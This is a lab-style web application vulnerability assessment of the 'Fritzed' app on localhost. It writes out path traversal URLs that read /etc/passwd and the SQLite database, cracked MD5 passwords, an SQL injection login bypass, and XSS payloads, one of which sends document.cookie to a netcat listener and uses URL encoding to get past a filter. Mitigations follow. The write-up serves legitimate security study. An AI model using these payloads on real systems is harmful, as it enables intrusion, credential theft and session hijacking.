# Fritzed Web Application Vulnerability Assessment


## Objectives

Fritzed is a newly acquired asset that includes the source code to a web application. The company was recently acquired by a competitor following a massive data breach. Fritzed had a reputation for insecure development practices, and Management would like to have a sense of how bad it is.

Below you will find the full report of the few critical vulnerabilities discovered during the assessment. The report ends with a list of proposed mitigations.



## Table of Contents

1. Manual Reconnaissance
2. Critical Vulnerabilities
  * Path Traversal
  * Cryptographic Failures
  * Injection (Blind SQL Injection)
  * Injection (Cross-Site-Scripting)
3. Impact and Proposed Mitigations



### Manual Reconnaissance: 

First, I start with scanning the web application with `dirb` to quickly identify additional hidden pages, which can contain low-hanging fruits vulnerabilities or valuable information that I can use to speed up my vulnerability assessment. I also start a scan with `sqlmap` to identify which parameters might be vulnerable to Injections.

![dirb_scan_results](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/dirb_scan_results.png)

![sql_map_test_1](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/sqlmap_test_1.png)


Following the `dirb` scan, I noticed a very interesting finding, the `robots.txt` file, which is the robots exclusion standard, and it is used to communicate with web crawlers and other web robots to inform them about which areas of the website should not be processed/scanned:

![robots_secret_page](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/robots_secret_page.png)

When visiting the page we are presented with the following message:

![secret_page](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/secret_page.png)

This is interesting. If we can access the database which contains the passwords, we might be able to crack them easily.

Next, I decide to visit the `Documentation` tab and explore the different links. Upon clicking on the first link `HELP` and then `RESOURCES.MD`, I notice the change in the web application's URL and how the request is made to locate and fetch the file I requested.

![path_traversal_1](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/path_traversal_1.png)


## Critical Vulnerabilities


### Path Traversal

I decided to test the web application for path traversal using the well-known `dot-dot-slash` method. After many attempts, I finally reached the root directory of the webserver using the following payload:

```bash
http://localhost:8888/?page=documentation&path=../../../../../../../../../../../../../../../../
```

If you are familiar with how Linux works and how to navigate the CLI, you will notice that each `..` entry moves one directory until it reaches the root directory.

Below, we can see the root directory displayed on the web browser:

![root_directory_displayed](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/root_directory_displayed.png)


Next, I navigate to `etc/passwd` but I cannot view the file due to the extension restriction:


![etc_passwd_not_allowed_to_read](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/etc_passwd_not_allowed_to_read.png)


Since I cannot read the file from the browser, I decided to look for a way to download it instead. By simply modifying the url parameters I was able to craft a payload to download the database file. Below is the payload I used to download it:


```bash
http://localhost:8888/download.php?file=../../../../../../../../../../../../../../../../etc/passwd
```

Below, the `etc/passwd` file:


![etc_passwd_file](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/etc_passwd_file.png)

Now that I have a working payload to download files from the webserver without needing to be authenticated, I created a second payload to download the database from the webserver.`/var/www/` being the default root folder of web servers, I decided to browse its content and found the database file `db` at `/var/www/database/db`. I used the following payload to download it:


```bash
http://localhost:8888/download.php?file=../../../../../../../../../../../../../../../../var/www/database/db
```

![database_downloaded](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/database_downloaded.png)


### Cryptographic Failures


We can see that the database type is listed on the download window prompt, we know which utility to use to open and browse its content: `SQLite`

Using the following command, I start the `SQLite browser` utility to explore the database:

```bash
sqlitebrowser
```

![sqlitebrowser_1](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/sqlitebrowser_1.png)


In the `Browse Data` tab, we can see 5 tables. One table is more interesting than the others: `fritzed_users`

We find 2 users: `admin` and `user`, with their emails and password hashes:

![sqlitebrowser_2](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/sqlitebrowser_2.png)

Their password hashes seem to be md5 hashed. We previously accessed a page letting us know that the passwords were using a weak password hashing algorithm. I decided to use the `CrackStation` website to quickly crack them:


![db_admin_cracked_password.png](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/db_admin_cracked_password.png)

![db_user_cracked_password.png](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/db_user_cracked_password.png)


`admin` password: `superman` and `user` password: `football`



### Injection (Blind SQL Injection)


Blind SQL injection techniques are used to bypass authentication. My next target is the login section of the web application where I will test my payload to identify a potential SQL injection vulnerability.

Most login forms that are connected to a database of users are often built in a way that the web application isn't interested in the content of the username and password but more whether the two values make a pair in the database. Following this logic, when you enter username `Jack` and password `SuperJack123` for example, the web application will ask the database if this one has a user `Jack` with the password `SuperJack123`. At this point, the database will reply with either yes or no (which means true or false). If it is true, the user is granted access, if false, access is denied.

A simple way to test for a SQL injection is to create a database query that replies with a `yes/true` all the time:


 ```sql
 ' OR '1'='1' --
 ```

I try the payload in the username field first since our previous scan with `sqlmap` indicated that the `password` field does not seem to be injectable, and on my first attempt, I successfully logged in as `admin`


![SQLi_login_as_admin_1.png](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/SQLi_login_as_admin_1.png)

![SQLi_login_as_admin_2.png](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/SQLi_login_as_admin_2.png)


### Injection (Cross-Site-Scripting)


Continuing my manual testing, I decide to test for XSS at the URL `http://localhost:8888/?page=`, I start with a basic payload that will create a pop-up window with the message `TEST` to evaluate the response from the web application:


JavaScript payload:

```java
<script>alert('TEST');</script>
````


![testing_XSS_payloads_response_404.png](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/testing_XSS_payloads_response_404png.png)


Next, I opened the developer tool to look at the source code to get a better idea about how my payload was processed and why the server returned a 404 response code:

 ![testing_XSS_payloads_source_code_detail](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/testing_XSS_payloads_source_code_detail.png)

 We can see that my malicious payload was inserted inside the HTML `body` tag. We need to find a way to escape the `body` tag first. To do so, we need to use `"` to close the `class` argument and add `>` to close and escape the tag. Using the following updated payload, I was able to exploit the XSS vulnerability:

 ```java
 "><script>alert('TEST');</script>
 ```


![testing_XSS_payloads_successful.png](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/testing_XSS_payloads_successful.png)

Below, we can see that we successfully escaped the body tag:

![testing_XSS_payloads_successful_source_code.png](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/testing_XSS_payloads_successful_source_code.png)


Many attacks can be conducted using XSS vulnerability. A common attack is to steal session cookies to hijack a logged-in user's session. I crafted the below payload to capture session cookies when a user clicks on my malicious link:

```java
"><script>fetch('http://10.0.2.15:47555?cookie=' + btoa(document.cookie) );</script>
```

Next I set up a listening server listening on port `47555` using Netcat:

```bash
nc -nlvp 47555
```

Next, I test my payload directly in the web browser, unfortunately, my listening server did not capture any request. Upon inspection of the source code, I noticed that the `+` is filtered out of the payload. 

![source_code_filtering_out_character](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/source_code_filtering_out_character.png)


This is common with some form of input validation, but a minor issue for us. To bypass the filtering, I decide to use the `Decoder` section of Burp Suite to "URL encode" the character `+` turning it into `%2b`:

![url_encode_plus_sign_burp](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/url_encode_plus_sign_burp.png)


New payload:

```java
"><script>fetch('http://10.0.2.15:47555?cookie=' %2b btoa(document.cookie) );</script>
```

Running the new payload, my listening server captured a request with the session cookie:

![cookie_captured](https://github.com/Sk3llington/Fritzed-Web-Application-Vulnerability-Assessment/blob/main/images/cookie_captured.png)


This type of attack can be turned into a Stored XSS, where the payload is sent via a ticket on the support page of a website. Once the customer support agent clicks on the ticket to open it, the payload would trigger, capture and send the agent's session cookie to the malicious actor who can then hijack the agent's session.

## Proposed Mitigations


### Path Traversal

#### - **Impact**:

A malicious actor can access files and directories stored outside the web root folder, these include application source code or configuration, and critical system files. Files containing username and passwords as well as PII (Personal Identifiable Information) can be accessed and exfiltered by attackers, exposing confidential data and/or compromising its integrity. Stolen data containing credentials can also lead to a breach, and allow attackers to move laterally and escalate privileges to further compromise a network.

#### - **Mitigations**:


- Try to work without user input when using file system calls
- Ensure users cannot supply all parts of the path, surround it with your path code
- Validate the user's input
- Use chrooted jails (it is used to create a limited sandbox for a process to run in, a little like a container) and code access policies to restrict where the files can be obtained or saved to.
- If forced to use user input for file operations, use `normalize()` to normalize the input before using in file io API's.


### Cryptographic Failures - _OWASP Top 2_

#### - **Impact**:

Can lead to exposure of sensitive data. Weak encryption of passwords in a database that uses unsalted or simple hashes to store everyone's passwords, for example, can be the target of a malicious actor taking advantage of a Path Traversal flaw to access the database, and easily crack the passwords it contains. Compromised credentials can lead to a multitude of attacks such as impersonating a C Suite executive to perform wire fraud, or steal intellectual property, or spy on an adversary.

#### - **Mitigations**:

- Define and classify which data is processed, stored, or transmitted by an application. Identify which data is sensitive according to privacy laws, regulatory requirements, or business needs, and apply the correct encryption methodology.
- Do not store data that is not needed. Data not stored cannot be stolen.
- Enable data at rest encryption.
- Use up-to-date and strong standard algorithms.
- Enforce the use of HTTPS only and encrypt all data in transit. Use TLS certificates.
- Do not use legacy protocols such as FTP and SMTP for transporting sensitive data.
- Store passwords using strong salted hashing functions.


### Injection (Blind SQL Injection) - _OWASP Top 3_

#### -**Impact**:

SQL Injection exploits can allow a malicious actor to read sensitive data from a database, and even modify or delete some of it. An attacker can also shut down the database management system and alter the functioning of a web application. Attacks can lead to alteration of databases, allowing an attacker to spoof identity, void transactions, and even change the balance of an account. The damage that can be done with SQL injections is practically limitless, making it one of the most dangerous attacks.

#### -**Mitigations**:

- Use of prepared statements with parameterized queries.
- Use of stored procedures.
- Allow-list input validation
- Escaping all user-supplied input


### Injection (Cross-Site-Scripting) -  _OWASP Top 3_

#### -**Impact**:

A malicious actor can use XSS to send a malicious script to another user because the web browser has no way to know if the script is malicious or not, and it will execute it. This type of attack can steal cookies, session tokens, or any other sensitive information held by the browser and used with the site containing the malicious script. This type of attack can lead to credential harvesting, session hijacking, or compromised payment information. The attacker can also redirect the victim to his malicious website to download malware to install persistence on the victim's system.

#### -**Mitigations**:

- Use a security-focused encoding library.
- Never insert untrusted data.
- Filter input on arrival.
- Use appropriate response headers (use Content-Type and X-Content-Type-Options headers).
- Use CSP or Content Security Policy, a browser security mechanism that helps mitigate XSS attacks.

